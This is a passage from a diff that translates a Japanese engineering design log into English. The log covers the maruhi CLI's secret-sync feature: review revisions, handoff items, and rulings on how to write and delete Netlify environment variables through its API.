-sync config」)に合わせた。(4) 機械検査の契約一致で `inputOf(contractDispatch)` が `undefined` なら `toMatchObject({})` が無条件に
-通る → 存在を先に断言。(5) nit: 標準形 ① の Environment `production` に reviewers を置くと**毎回の push to main が承認待ち**になる
-(schedule 側は言っていて deploy 側は言っていなかった非対称)→ Four eyes の手順 1 に 1 文。(6) nit: jq 不要の `it` を
-`describe.skipIf(!hasJq)` の外へ。
+**Revision 2 (2026-09-08, pullfrog's first review〔5e138fa〕)**: (1) **the token variable-name mismatch** — the new page's `worker` target names "the http-driver example in Deploy targets" while writing `CLOUDFLARE_API_TOKEN`, and the named target had `CF_API_TOKEN` (tracing both pages: wrangler can't read the name `ci run --env tokens` passes, so deploy fails) → **deploy-targets.mdx's side became `CLOUDFLARE_API_TOKEN`** (the push line and the JSON's `token.name`. Aligned to the name wrangler reads. The CLI test's fixture name `CF_API_TOKEN` isn't docs, so left as-is). (2) **`SCHEDULED_TARGETS` is also checked against the config's actual targets** — since only dispatch's input was being checked, a typo in the list or a target deleted from the config would auto-create an unprotected Environment on every schedule then fall over on 404 → the `targets` job's script now checks "input when dispatch, the list when schedule" under the same `for name in $names`, then builds the JSON (case added: `web wep` = 1, no output). (3) "CI mode reads no config file" contradicted `ci sync` reading `maruhi.sync.json` → aligned to the CLI's wording ("except the sync config"). (4) In the mechanical check's contract match, if `inputOf(contractDispatch)` were `undefined`, `toMatchObject({})` would pass unconditionally → existence is asserted first. (5) nit: putting reviewers on standard form ①'s Environment `production` makes **every push to main wait for approval** (the asymmetry — said on the schedule side but not the deploy side) → one sentence added to Four eyes step 1. (6) nit: the jq-free `it` moved out of `describe.skipIf(!hasJq)`.
 
-**改訂 3(2026-09-08、pullfrog の差分レビュー〔c0176f1〕)**: `targets` job の検査ループ(シェルの語分割 = 空白・タブ・改行)と JSON 化
-(jq の `split(" ")`)が別の分割で、タブ・改行区切りの `SCHEDULED_TARGETS`(YAML の `|` ブロック等)では検査は個別に通り JSON は
-1 要素 `"web\napi"` になって未検査のまま `environment:` に届く(この job が防ぐはずの無保護 Environment の自動作成)→ JSON 化を
-**同じ語分割**から作る(`printf '%s\n' $names | jq -cRn '[inputs | select(. != "")]'`)。態を追加(`"web\tpreview\n"` →
-`["web","preview"]`)。コメントの「separated by spaces」を「whitespace」に。
+**Revision 3 (2026-09-08, pullfrog's diff review〔c0176f1〕)**: the `targets` job's checking loop (shell word-splitting = space / tab / newline) and its JSON construction (jq's `split(" ")`) split differently, so for a tab- or newline-separated `SCHEDULED_TARGETS` (a YAML `|` block etc.) the check would pass each name but the JSON would be a single `"web\napi"` element reaching `environment:` unchecked (the unprotected-Environment auto-creation this job exists to prevent) → the JSON is now built from **the same word splitting** (`printf '%s\n' $names | jq -cRn '[inputs | select(. != "")]'`). A case was added (`"web\tpreview\n"` → `["web","preview"]`). The comment's "separated by spaces" became "whitespace".
 
-**SY4 以降への申し送り(SY3 完了)**: (1) **SY4** Netlify(http プリセットの宣言 1 つ + モック応答 — 第 2 段の裁定録の http
-プリセットの形)。(2) **SY5** `gh secret set`(第 1 段 = レシピ、第 2 段 = 標準形 ② の `maruhi-sync.yml` に step を足す形が自然。
-第 3 段の `GH_ENV` / `ghArgument` を流用可。bootstrap は fine-grained PAT か App トークン — 補足 8 Q1)。(3) 全ターゲット一括の plan
-(`--all`)— SY3 では `SCHEDULED_TARGETS` で代替したので需要待ち。(4) `sync diff`(補足 7 P5)— 未実装のまま。docs は「報告しない」
-と明記済み。(5) 入れ子 `maruhi ci run --env tokens -- maruhi ci sync <target>`(exec ドライバを GitHub secrets ゼロで — 裁定 B の
-新案)は未検証。需要が出たらテスト(内側の OIDC 端点の継承・剥がし箇所の棚卸し)を先に。(6) `setup-maruhi` を含む最初のリリース
-タグが切られたら、テンプレートの `<tag>` の案内文と action README の「tags up to v0.1.0-rc.2 predate it」を実タグに(機械検査は
-`<tag>` の 2 回を見ているので、具体値にするなら検査も同時に)。(7) 人間タスク(未消化 — 本 PR で追加: **実リポジトリでの
-workflow 2 本の通し**〔Environment の自動作成・required reviewers の待ち・`environment` claim を入れたポリシーでの 404 / 200・
-`schedule` の承認待ち・`concurrency` の pending 置き換え〕、**Free / Pro / Team の private リポジトリで required reviewers が出ない
-ことの実機確認**): `gh workflow run` の実機での通し、Windows での実行体の解決、実アカウント(Cloudflare / Vercel)での http /
-`ci sync` の通し、Vercel の一覧がページ分けされる条件の実測、macOS のパイプ容量、`vercel env rm` の不在名の終了コード、文言の好み。
+**Handoff to SY4 onward (SY3 complete)**: (1) **SY4** Netlify (one http-preset declaration + a mock response — the http-preset shape from stage 2's ruling record). (2) **SY5** `gh secret set` (stage 1 = the recipe; stage 2 = naturally a step added to standard form ②'s `maruhi-sync.yml`. Stage 3's `GH_ENV` / `ghArgument` are reusable. Bootstrap is a fine-grained PAT or App token — supplement 8 Q1). (3) All-target plan (`--all`) — SY3 substitutes via `SCHEDULED_TARGETS`, so awaiting demand. (4) `sync diff` (supplement 7 P5) — still unimplemented. docs already says it "doesn't report". (5) Nested `maruhi ci run --env tokens -- maruhi ci sync <target>` (the exec driver with zero GitHub secrets — ruling B's new option) is unverified. If demand appears, test first (inner OIDC endpoint inheritance, unwrap-site audit). (6) When the first release tag containing `setup-maruhi` is cut, replace the templates' `<tag>` guidance and the action README's "tags up to v0.1.0-rc.2 predate it" with the real tag (the mechanical check looks for `<tag>` × 2, so a concrete value must update the check too). (7) Human tasks (carried over — added in this PR: **running the 2 workflows on a real repo**〔Environment auto-creation, the required-reviewers wait, 404 / 200 under a policy with the `environment` claim, `schedule`'s approval wait, `concurrency`'s pending replacement〕, **verifying on a real machine that required reviewers don't appear on Free / Pro / Team private repos**): `gh workflow run` on a real machine, executable resolution on Windows, http / `ci sync` end-to-end on real accounts (Cloudflare / Vercel), measuring when Vercel paginates its listing, macOS pipe capacity, `vercel env rm`'s missing-name exit code, wording preferences.
 
 ---
 
-### SY4 実装時の裁定録(2026-09-08)
+### SY4 implementation-time ruling record (2026-09-08)
 
-対象は ROADMAP **SY4**(第 2 陣の同期先)のうち **Netlify** = 第 1 波。SY2 第 2 段 2a(PR #155)の宣言的 http プリセット
-(`HTTP_PRESETS` — JSON テンプレート + モック応答)に Netlify を載せ、`sync plan / apply`・`ci sync`・`sync init --preset netlify` を
-動かす。Netlify を http 限定にする理由は確定済み(CLI の `env:set KEY value` は値を引数に取る — §3 冒頭の表のドライバ行・補足 10 V2・
-補足 14 M6・SY1 実測表)で蒸し返していない。他の候補(Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages)は
-本セッションでは扱わない(裁定 K)。出発点は SY3 の申し送り (1)「http プリセットの宣言 1 つ + モック応答」。各裁定点は同じループ
-(3 案以上 → 上位互換の探索 → 新案が出ない周で終了 → 理由付きで選定)で決め、「新案なし」の周では壊れ方(既存 key への POST・
-1 変数 1 リクエストとレート制限・`all` と個別 context の重なり・secret は読めない・scopes のプラン制約・`site_id` 省略・部分成功・
-429・一覧と送信の間の競合・空の変数の残骸)を問うた。**申し送り (1) の「宣言 1 つ + モック」は半分だけ成り立った**: Netlify には
-upsert が無く、既存の宣言の型(1 リクエストで upsert)では表せないので、型を広げる(全プリセットに効く一般化 — 裁定 A / C / D)
-方を採り、Netlify 専用コードは `runBatch` / `sync-plan.ts` に足していない。
+The target is ROADMAP **SY4** (wave-2 sync destinations)'s **Netlify** = wave 1. Put Netlify on SY2 stage 2a's (PR #155) declarative http presets (`HTTP_PRESETS` — JSON templates + mock responses), driving `sync plan / apply`, `ci sync`, and `sync init --preset netlify`. The reason Netlify is http-only is settled (the CLI's `env:set KEY value` takes the value as an argument — §3's head table's driver row, supplement 10 V2, supplement 14 M6, SY1's measurement table), not re-litigated. Other candidates (Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages) aren't handled this session (ruling K). The starting point is SY3's handoff (1) "one http-preset declaration + a mock". Each ruling point was decided by the same loop (3+ options → search for a superset → end on a no-new-option round → choose with reasons), and on "no new option" rounds we asked about failure modes (POST to an existing key, 1 request per variable and rate limits, `all` overlapping per-context values, secrets being unreadable, plan constraints on scopes, omitting `site_id`, partial success, 429, races between listing and sending, empty-variable debris). **Handoff (1)'s "one declaration + a mock" held only halfway**: Netlify has no upsert, and the existing declaration type (1 request = upsert) can't express it, so the type was widened instead (a generalization benefiting all presets — rulings A / C / D), and no Netlify-specific code was added to `runBatch` / `sync-plan.ts`.
 
-**前提の確認(実物・公式 docs で確かめた事実。日付はすべて 2026-09-08)**:
-(1) **open-api.netlify.com の swagger(2.57.1)**: host `api.netlify.com`、base `/api/v1`。環境変数は**アカウント(= チーム)単位**の
-エンドポイントに `site_id` クエリでサイトを指す(`site_id` の説明: 「If provided, create an environment variable on the site level,
-not the account level」= 省くと**チーム共有の変数**を書く)。`GET /accounts/{account_id}/env?site_id=&context_name=&scope=` は
-配列(`envVar` = `{key, scopes[], values[{id, value, context, context_parameter}], is_secret, updated_at, updated_by}`)。`POST
-/accounts/{account_id}/env?site_id=` = 配列で **「Creates new environment variables」**(201、配列を echo)。`PUT …/env/{key}` =
-「Updates an existing environment variable and all of its values. **Existing values will be replaced** by values provided」(200)。
-`PATCH …/env/{key}` = 本文 `{context, context_parameter?, value}` で **「Updates or creates a new value for an existing environment
-variable」**(201。key は「The existing environment variable key name」)。`DELETE …/env/{key}` = 変数ごと(204)、`DELETE
-…/env/{key}/value/{id}` = 1 context の値だけ(204)。既定応答(エラー)は `{code: int64, message: string(required)}`。`context` の
-閉集合は `all / dev / dev-server / branch-deploy / deploy-preview / production / branch`(`branch` は `context_parameter` にブランチ名 —
-PATCH の説明「`branch` must be provided with a value in `context_parameter`」)。`scopes` = `builds / functions / runtime /
-post-processing`「Granular scopes are available on Pro plans and above」。`is_secret` = 「Secret values are only readable by code
-running on Netlify's systems. With secrets, only the local development context values are readable from the UI, API, and CLI」。
-認証は OAuth2(Bearer)。`GET /api/v1/sites/{site_id}/env` は `account_id` 不要の便宜メソッド(読みだけ)。
-(2) **netlify-cli(github.com/netlify/cli main、`src/commands/env/env-set.ts` / `env-unset.ts` / `src/utils/env/index.ts`)**:
-`env:set` は **`getEnvVars({accountId, siteId})` で一覧を取ってから分岐**する — 既存 key + `--context` → `setEnvVarValue`(PATCH)を
-context ごと、既存 key + context なし → `updateEnvVar`(PUT。`all` なら secret 時に dev を空にして 4 context に展開)、不在 →
-`createEnvVars`(POST。配列 1 件)。**単独の upsert は無い**。`accountId` は `siteInfo.account_slug`(チームの slug)。secret の制約は
-CLI が先に弾く: `all` / `dev` を含む context は「specify a non-development context」、`post_processing` scope は「Secret values cannot
-be used within the post-processing scope」で拒み、secret の scopes は `builds / functions / runtime` の 3 つを明示して送る。既定の
-scopes は全 4 つ(`ALL_ENVELOPE_SCOPES`。API が**返す**綴りは `post_processing`、受けるのは `post-processing` — CLI のコメント)。
-`env:unset --context X` は X と **`all` の value id を消し**(`deleteEnvVarValue`)、`all` だったら残る context を PATCH で作り直す;
-context 指定なしは `deleteEnvVar`(key ごと)。`getValueForContext` は `values.find(context === "all" || context === X)`(配列順)。
-(3) **docs.netlify.com**: API get-started — PAT は **User settings → Applications → Personal access tokens**(`app.netlify.com/user/
-applications#personal-access-tokens`。New access token・名前・SAML チームへのアクセス・**有効期限**)。**レート制限 500 requests /
-minute**(`X-RateLimit-Limit / Remaining / Reset` ヘッダー。**429 の status も `Retry-After` も docs に無い**)。30 秒超のリクエストは
-打ち切り。Environment variables overview — 値は **5,000 文字**・key は 255 文字まで、Functions は AWS Lambda の上限、サイト変数が
-共有変数に勝つ(scope × context ごと)、context 別の値は **deploy context の優先規則**(`branch` > `production` / `deploy-preview` /
-`branch-deploy` / `dev` > 全 context)に従う、scopes の選択は Pro / Enterprise、「Local development」は secret にできない。Secrets
-Controller — 「**Secret values are write-only**. After setting a value using the UI, CLI, or API, you will no longer have access to a
-human-readable version」「won't return unmasked values … for any deploy context besides `dev`」「Secret values must be set to explicit
-deploy contexts and scopes」「cannot have the `post processing` scope」、secret scanning がビルド出力に値を見つけたら**ビルドを失敗**
-させる。プランの制限は書かれていない(全プラン扱い)。
-(4) **未確認(docs / swagger に無く、実アカウントで確かめる = 人間タスク)**: 既存 key への `POST` の応答(Support Forums の報告では
-422 + 「Environment variable with the same key name already exists on this site …」— 一次資料には無い)、`PUT` が不在 key を作るか、`PATCH` 不在 key の status(404 と推定するが実装は依存しない)、配列 `POST` の部分失敗の形、
-Starter プランで scopes の部分集合(secret の 3 scope)が通るか、429 の `Retry-After` の有無、空文字列の受理、`all` の値と個別
-context の値が同居したときの API の応答(docs の優先規則には依る)、値を全部消した変数が空のまま残るか。
-(5) **コード側の事実**: `SyncPreset` は `exec` / `http` を**両方必須**、`EXEC_PRESETS: Record<PresetId, …>` が全 id の exec を要求、
-`decodeReceipt` が `"cloudflare-workers" | "vercel"` を直書き、`PathToken` に名前のトークンが**無い**(Netlify の PATCH / DELETE は
-**key をパスに置く**)、`buildBatches` は `preset.batch` で分割、`describeDestination`(sync-plan.ts)は `options.environment` だけを
-ヘッダー行に出す。`Redacted.value(` は `sync-http.ts` に 1 か所(本文のエントリの値の葉)。
+**Premise verification (facts confirmed against the real things / official docs. All dates 2026-09-08)**:
+(1) **open-api.netlify.com's swagger (2.57.1)**: host `api.netlify.com`, base `/api/v1`. Environment variables live on **account (= team)-scoped** endpoints and point at a site via the `site_id` query (`site_id`'s description: "If provided, create an environment variable on the site level, not the account level" = omitting it writes a **team-shared variable**). `GET /accounts/{account_id}/env?site_id=&context_name=&scope=` returns an array (`envVar` = `{key, scopes[], values[{id, value, context, context_parameter}], is_secret, updated_at, updated_by}`). `POST /accounts/{account_id}/env?site_id=` takes an array, **"Creates new environment variables"** (201, echoes the array). `PUT …/env/{key}` = "Updates an existing environment variable and all of its values. **Existing values will be replaced** by values provided" (200). `PATCH …/env/{key}` = body `{context, context_parameter?, value}`, **"Updates or creates a new value for an existing environment variable"** (201. key is "The existing environment variable key name"). `DELETE …/env/{key}` = the whole variable (204); `DELETE …/env/{key}/value/{id}` = only one context's value (204). The default (error) response is `{code: int64, message: string(required)}`. `context`'s closed set is `all / dev / dev-server / branch-deploy / deploy-preview / production / branch` (`branch` takes a branch name in `context_parameter` — PATCH's description: "`branch` must be provided with a value in `context_parameter`"). `scopes` = `builds / functions / runtime / post-processing`, "Granular scopes are available on Pro plans and above". `is_secret` = "Secret values are only readable by code running on Netlify's systems. With secrets, only the local development context values are readable from the UI, API, and CLI". Auth is OAuth2 (Bearer). `GET /api/v1/sites/{site_id}/env` is a convenience method needing no `account_id` (read only).
+(2) **netlify-cli (github.com/netlify/cli main, `src/commands/env/env-set.ts` / `env-unset.ts` / `src/utils/env/index.ts`)**: `env:set` **branches after listing via `getEnvVars({accountId, siteId})`** — existing key + `--context` → `setEnvVarValue` (PATCH) per context; existing key + no context → `updateEnvVar` (PUT; for `all`, empties dev on secrets then expands to 4 contexts); absent → `createEnvVars` (POST, a 1-item array). **No single upsert exists**. `accountId` is `siteInfo.account_slug` (the team's slug). Secret constraints are checked by the CLI first: contexts containing `all` / `dev` are refused with "specify a non-development context", the `post_processing` scope with "Secret values cannot be used within the post-processing scope", and a secret's scopes are sent explicitly as the 3 `builds / functions / runtime`. Default scopes are all 4 (`ALL_ENVELOPE_SCOPES`. The spelling the API **returns** is `post_processing`; what it accepts is `post-processing` — per a CLI comment). `env:unset --context X` deletes X's **and `all`'s** value ids (`deleteEnvVarValue`), and re-creates the remaining contexts via PATCH if it was `all`; no context = `deleteEnvVar` (whole key). `getValueForContext` is `values.find(context === "all" || context === X)` (array order).
+(3) **docs.netlify.com**: API get-started — PATs live at **User settings → Applications → Personal access tokens** (`app.netlify.com/user/applications#personal-access-tokens`. New access token, name, SAML-team access, **expiry**). **Rate limit 500 requests / minute** (`X-RateLimit-Limit / Remaining / Reset` headers. **Neither a 429 status nor `Retry-After` is in the docs**). Requests over 30 s are cut. Environment-variables overview — values up to **5,000 chars**, keys up to 255; Functions follow AWS Lambda's limits; site variables beat shared variables (per scope × context); per-context values follow **deploy-context precedence** (`branch` > `production` / `deploy-preview` / `branch-deploy` / `dev` > all contexts); scope selection is Pro / Enterprise; "Local development" can't be secret. Secrets Controller — "**Secret values are write-only**. After setting a value using the UI, CLI, or API, you will no longer have access to a human-readable version"; "won't return unmasked values … for any deploy context besides `dev`"; "Secret values must be set to explicit deploy contexts and scopes"; "cannot have the `post processing` scope"; secret scanning **fails the build** when it finds a value in build output. No plan restriction is stated (all plans).
+(4) **Unconfirmed (not in docs / swagger; check on a real account = human tasks)**: the response to `POST` on an existing key (Support-Forums reports say 422 + "Environment variable with the same key name already exists on this site …" — not in primary sources), whether `PUT` creates an absent key, `PATCH` on an absent key's status (estimated 404; the implementation doesn't depend on it), the partial-failure shape of array `POST`, whether a scopes subset (a secret's 3 scopes) passes on the Starter plan, whether 429 has `Retry-After`, empty-string acceptance, the API's response when an `all` value and per-context values coexist (per docs' precedence rules), and whether a fully-emptied variable lingers empty.
+(5) **Code-side facts**: `SyncPreset` requires **both** `exec` / `http`; `EXEC_PRESETS: Record<PresetId, …>` requires an exec for every id; `decodeReceipt` hard-codes `"cloudflare-workers" | "vercel"`; `PathToken` has **no name token** (Netlify's PATCH / DELETE put the **key in the path**); `buildBatches` splits by `preset.batch`; `describeDestination` (sync-plan.ts) prints only `options.environment` on the header line. `Redacted.value(` appears once in `sync-http.ts` (the value leaf of body entries).
 
-**操作の表(裁定 B〜F の入力。「未確認」は (4))**:
+**Operations table (input to rulings B–F. "Unconfirmed" is (4))**:
 
-| 操作 | 不在 key | 既存 key | `all` × 個別 context | secret | 失敗 |
+| Operation | Absent key | Existing key | `all` × per-context | secret | Failure |
 |---|---|---|---|---|---|
-| `POST …/env`(配列) | 作る(201、値を echo) | **未確認**(CLI は呼ばない) | 本文の `values[]` に両方置ける(CLI の PUT 展開の形) | `is_secret` + scopes 3 つ(`all` / `dev` 不可) | `{code, message}`。部分失敗の形は未確認 |
-| `PATCH …/env/{key}` | **既存 key 限定**(swagger 原文。status 未確認) | 1 context の値を作る / 更新(201) | 個別を足しても `all` は残る(優先規則で個別が勝つ) | フラグ・scopes は**変えない** | `{code, message}` |
-| `PUT …/env/{key}` | 未確認 | **全 values を置換**(他 context の値が消える) | — | 変えられる | — |
-| `DELETE …/env/{key}` | 404 | 変数ごと(全 context) | — | — | 204 |
-| `DELETE …/env/{key}/value/{id}` | 404 | 1 context の値だけ(id は一覧から) | `all` の値は別 id | 一覧に値は返らないが id は返る | 204 |
-| `GET …/env?site_id=` | — | 配列(値つき。secret は返らない) | 両方の値が `values[]` に並ぶ | — | ページ分けの記述なし |
+| `POST …/env` (array) | creates it (201, echoes the value) | **unconfirmed** (the CLI doesn't call it) | both can be placed in the body's `values[]` (the CLI's PUT-expansion shape) | `is_secret` + the 3 scopes (`all` / `dev` not allowed) | `{code, message}`. Partial-failure shape unconfirmed |
+| `PATCH …/env/{key}` | **existing keys only** (swagger wording; status unconfirmed) | creates / updates one context's value (201) | adding a per-context keeps `all` (per-context wins by precedence) | **can't** change flag / scopes | `{code, message}` |
+| `PUT …/env/{key}` | unconfirmed | **replaces all values** (other contexts' values disappear) | — | changeable | — |
+| `DELETE …/env/{key}` | 404 | the whole variable (all contexts) | — | — | 204 |
+| `DELETE …/env/{key}/value/{id}` | 404 | one context's value only (id from listing) | `all`'s value is a separate id | the listing doesn't return values but does return ids | 204 |
+| `GET …/env?site_id=` | — | array (with values. secrets not returned) | both values appear in `values[]` | — | no pagination described |
 
-**A. http 限定プリセットの表現** — 列挙: (i) `SyncPreset.exec` を省略可(`exec?:`)にして `defaultDriver` を足す / (ii) 起動時に落ちる
-「拒否する exec 宣言」(`command` 無し)を置く / (iii) Netlify では `driver: "http"` を**必須**にし、省略・`"exec"` は設定の誤り /
-(iv) プリセットを exec 系 / http 系の 2 表に分けて合成(いまの `SYNC_PRESETS` がそれ)。第 1 周の新案: **(v) `exec: ExecPreset |
-{unavailable: string}`** — 宣言が無い理由を**宣言自身が文面として持つ**(あり — 「なぜ無いか」の単一の正が 1 か所になり、設定の
-検証・`sync init` の両方が同じ文を言う。既定は `defaultDriverOf` = exec があれば exec、無ければ http で、「driver 省略 = exec」の
-規則は exec を持つプリセットでは不変。SY5 の gh は逆に http を持てない〔GitHub の secrets API は libsodium 封印が要る〕ので同じ形で
-`http: {unavailable}` と書ける)。第 2 周(壊れ方): (i) は `exec` が無いことと「なぜ無いか」が別の場所に散る。(ii) は起動まで誤りが
-分からない。(iii) は「`driver` 省略 = exec」を例外つきの規則にし、Netlify だけ 1 キー多く打たせる — 平文の行き先が CLI か API か
-という区別は Netlify では存在しない(API しか無い)ので、明示させる理由(第 2 段の裁定 B「キー 1 つで行き先が変わる形は明示」)が
-当たらない。(v) は `EXEC_PRESETS` / `HTTP_PRESETS` を `Record<PresetId, …>` から `satisfies Record<string, …>` に緩める(id ごとに
-片方だけ持てる)(なし)。**選定 = (v)**。`sync init` は http しか無いプリセットでも生成物に `driver: "http"` を**明示して出す**
-(読者が平文の行き先を読める形。省略しても通る)。棄却: (i)(理由の置き場が散る)、(ii)(遅い失敗)、(iii)(例外つきの規則)、
-(iv)(既にその形で、問題は型の要求)。レシートの `preset` 許容値は `PRESET_IDS`(sync-types.ts の定数配列 — 型もそこから導く)から
-引く形にした = 検査の緩和であって形式変更ではない(`sync-receipt:<target>` の中身・`version: 1` は不変)。
+**A. Expressing an http-only preset** — enumeration: (i) make `SyncPreset.exec` optional (`exec?:`) and add `defaultDriver` / (ii) place a "refusing exec declaration" (no `command`) that fails at startup / (iii) make `driver: "http"` **required** on Netlify — omission / `"exec"` is a config error / (iv) split presets into exec-family / http-family tables then merge (what `SYNC_PRESETS` already is). Round-1 new option: **(v) `exec: ExecPreset | {unavailable: string}`** — the declaration itself carries the reason it's absent **as wording** (available — "why it's absent" has its single source of truth in one place, and both config validation and `sync init` say the same sentence. The default is `defaultDriverOf` = exec if present, else http, so the rule "driver omitted = exec" is unchanged for presets that have exec. SY5's gh conversely can't have http〔GitHub's secrets API needs libsodium sealing〕and can write `http: {unavailable}` in the same shape). Round 2 (failure modes): (i) scatters "absent" and "why absent" to different places. (ii) doesn't surface the error until startup. (iii) makes "driver omitted = exec" a rule with exceptions, and has Netlify alone force an extra key — the CLI-vs-API distinction of plaintext's destination doesn't exist for Netlify (there's only an API), so the reason for explicitness (stage 2's ruling B: "a shape where one key changes the destination must be explicit") doesn't apply. (v) relaxes `EXEC_PRESETS` / `HTTP_PRESETS` from `Record<PresetId, …>` to `satisfies Record<string, …>` (each id may hold only one side) (no). **Chosen = (v)**. `sync init` still **explicitly emits** `driver: "http"` on the product even for an http-only preset (a shape where the reader can see plaintext's destination. It also passes when omitted). Rejected: (i) (the reason's home scatters), (ii) (late failure), (iii) (a rule with exceptions), (iv) (already that shape — the problem is the type's requirement). The receipt's `preset` allowed values now come from `PRESET_IDS` (a constant array in sync-types.ts — the type derives from it too) = a relaxation of the check, not a format change (`sync-receipt:<target>`'s content and `version: 1` are unchanged).
 
-**C. 書き込みの意味論(upsert の作り方)** — 列挙: (i) `PATCH …/env/{key}` だけ(不在 key が作れるなら 1 手) / (ii) `POST`(配列)で
-作り、失敗した既存 key を `PUT` で更新 / (iii) `PUT …/env/{key}` で常に全体を書く / (iv) 一覧で有無を見てから `POST` / `PATCH` に
-分ける。第 1 周の新案: (v) `PATCH` を送り **404 なら `POST`**(宣言に `fallback: {onStatus, request}` を足す一般化)/ (vi) `POST` を
-送り既存 key の失敗なら `PATCH`(あり — どちらも「応答を読んで分岐」だが宣言のデータで表せる)。第 2 周(壊れ方): (i) は swagger
-原文が「existing environment variable」で不在 key を作らない(前提 (1))。(v) / (vi) は**未確認の status**(不在 key の PATCH が
-404 か、既存 key の POST が何を返すか — 前提 (4))に依存し、外れると新規変数を 1 つも書けない・最悪 (vi) は二重に作る。実アカウントの
-通しが本セッションでできない以上、芯を未確認の事実に載せない。(iii) は `PUT` が**他 context の値を置き換える**(前提 (1))= 「同期先の
-他の値に触れない」に反し、secret の値は一覧に返らないので保存して書き戻すこともできない(secret を空にする)。(iv) は **netlify-cli
-自身の形**(前提 (2))で、依存するのは docs に書かれた意味論(`POST` = 新規、`PATCH` = 既存)だけ。一覧は名前の有無にしか使わない
-(値は捨てる = Vercel の削除の突合と同じ規律。読み戻しではない)。一覧に続きがある(不完全)ときは何も送らずに止める(fail-closed —
-Netlify の一覧にページ分けの記述は無いので `nextPage` 無し = 常に完全)。一覧と送信の間に同名が作られる競合は `POST` が同期先の
-失敗として文面に出て、次の apply は一覧で見つけて `PATCH` になる(自己修復。テストで固定)(なし)。**選定 = (iv)** を一般化した
-**`HttpWriteStrategy`**: `{kind: "upsert", request, batch}`(Workers / Vercel — いままでの形)| `{kind: "create-or-update", list,
-create, update}`。**1 変数 1 リクエスト**にした理由: `PATCH` は形からして 1 変数、`POST` は配列を受けるが**部分失敗の形が未確認**
-(前提 (4))なので件数 1 に固定し、届いた名前を正確に割る(レート制限 500 / min に対し 1 変数 1 リクエスト + 一覧 1 回 = 100 変数で
-101 リクエスト。CLI と同じ密度)。`buildBatches` は create-or-update では**書き込み全部を 1 バッチ**にし(一覧を 1 回だけ読む)、
-`runBatch` が中で 1 変数ずつ送って最初の失敗で止める(`delivered` = それまでの名前 → レシートに残る。`sync-plan.ts` の
-`runBatches` は無変更)。`entries: "single"`(本文 = エントリそのもの)と `PathToken` の `{kind: "name"}`(**1 変数リクエストの
-パスにだけ**許す — 値のトークンは相変わらずパスに存在しない。宣言の走査テストで固定)を足した。棄却: (i)(不在 key を作らない)、
-(ii)(PUT が他 context を壊す)、(iii)(同上 + secret を空にする)、(v) / (vi)(未確認の status に依存)。
+**C. Write semantics (how to build an upsert)** — enumeration: (i) `PATCH …/env/{key}` only (1 step if absent keys can be created) / (ii) create via `POST` (array), update failed existing keys via `PUT` / (iii) always write the whole via `PUT …/env/{key}` / (iv) check existence in the listing, then split between `POST` / `PATCH`. Round-1 new options: (v) send `PATCH` and **on 404, `POST`** (a generalization adding `fallback: {onStatus, request}` to the declaration) / (vi) send `POST` and on existing-key failure `PATCH` (available — both are "read the response and branch", expressible in declaration data). Round 2 (failure modes): (i): the swagger wording is "existing environment variable", so it doesn't create absent keys (premise (1)). (v) / (vi) depend on **unconfirmed statuses** (whether PATCH on an absent key is 404, what POST on an existing key returns — premise (4)); if wrong, they write zero new variables or, worst case for (vi), double-create. Since this session can't run against a real account, don't rest the core on unconfirmed facts. (iii): `PUT` **replaces other contexts' values** (premise (1)) = violates "don't touch other values at the destination", and secret values can't be saved and written back since they aren't returned by listing (it would empty the secret). (iv) is **netlify-cli's own shape** (premise (2)), depending only on documented semantics (`POST` = new, `PATCH` = existing). The listing is used only for name presence (values discarded = same discipline as Vercel's delete matching. Not a read-back). When the listing has more pages (incomplete), stop having sent nothing (fail-closed — since Netlify's listing documents no pagination, `nextPage` absent = always complete). A race where the same name is created between listing and sending surfaces as `POST`'s destination failure in the message, and the next apply finds it in the listing → `PATCH` (self-healing. Pinned by test) (no). **Chosen = (iv)**, generalized as **`HttpWriteStrategy`**: `{kind: "upsert", request, batch}` (Workers / Vercel — the existing shape) | `{kind: "create-or-update", list, create, update}`. Why **1 request per variable**: `PATCH` is per-variable by shape; `POST` takes an array but its **partial-failure shape is unconfirmed** (premise (4)), so the count is pinned at 1 to assign delivered names exactly (against the 500/min rate limit, 1 request per variable + 1 listing = 101 requests for 100 variables. Same density as the CLI). `buildBatches` makes **all writes one batch** under create-or-update (reads the listing only once), and `runBatch` sends them one variable at a time inside, stopping at the first failure (`delivered` = the names so far → they land on the receipt. `sync-plan.ts`'s `runBatches` is unchanged). Added `entries: "single"` (body = the entry itself) and `PathToken`'s `{kind: "name"}` (**allowed only on per-variable request paths** — value tokens still don't exist on paths. Pinned by the declaration-scanning test). Rejected: (i) (doesn't create absent keys), (ii) (PUT breaks other contexts), (iii) (same + empties the secret), (v) / (vi) (depend on unconfirmed statuses).
 
-**D. 削除の意味論** — 列挙: (i) `DELETE …/env/{key}`(変数ごと = 他 context の値も消える)/ (ii) 一覧で該当 context の value id を引いて
-`DELETE …/env/{key}/value/{id}`(Vercel の `lookup` と同じ形)/ (iii) 削除しない(レシートに残して警告)。第 1 周の新案: **(iv) (ii) +
-照合した値が変数の全値なら `DELETE …/env/{key}`**(あり — maruhi が作った変数〔この context の値しか無い〕は変数ごと消え、他の
-context の値を持つ変数は値 1 つだけ消える。空の変数の残骸を作らず、他の値にも触れない)。第 2 周(壊れ方): (i) は「同期先の他の値に
-触れない」に反する(production ターゲットの削除が deploy-preview の手書きの値を消す)。(iii) は Vercel と非対称で、レシートが詰まる。
-(ii) は値を全部消した変数が空のまま残るか未確認(前提 (4))で、残るなら dashboard に空の変数が並ぶ。(iv) の判定は一覧の `values[]` で
-できる(id は secret でも返る)。一覧の直後に別の値が足された競合で key ごと消す窓は Vercel の 404 と同じ幅で、netlify-cli の
-`env:unset` も同じ一覧 → 削除の 2 手。`all` の値しか無い変数は個別 context のターゲットからは**照合されない**(値が無い = 消えた
-扱い。maruhi は `all` を書いていないので触れない — docs に明記)(なし)。**選定 = (iv)**。`lookup` の宣言の一般化: `itemsField: null`
-(本文そのものが配列)、`match.valuesField`(id を持つ要素の入れ子 — Netlify の `values[]`)、`targetField` は**文字列一致 or 配列
-includes**(Vercel の `target[]` / Netlify の `context`)、`nextPage` 省略可、`removeItem`(全値のとき)。Vercel の宣言は同じ型に
-そのまま乗る(挙動不変 — 既存テストが固定)。棄却: (i)(他の値に触れる)、(ii)(残骸)、(iii)(非対称)。
